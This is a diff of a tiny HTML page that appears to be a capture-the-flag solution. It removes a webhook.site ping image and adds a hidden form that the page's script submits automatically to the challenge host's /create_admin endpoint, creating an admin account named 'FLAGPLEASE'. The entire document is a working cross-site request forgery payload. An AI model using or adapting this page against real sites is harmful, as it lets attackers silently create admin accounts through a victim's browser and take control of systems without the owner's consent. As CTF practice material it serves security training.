@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
-<img src="https://webhook.site/95d83a71-39f6-4ff1-8670-a9dcf8fcb647?c=ping">
+<form action="http://tasks.goidactf.ru:20159/create_admin" method="POST">
+  <input type="hidden" name="new_admin_login" value="FLAGPLEASE">
+</form>
+<script>
+document.forms[0].submit();
+</script>
 </body>
 </html>
+
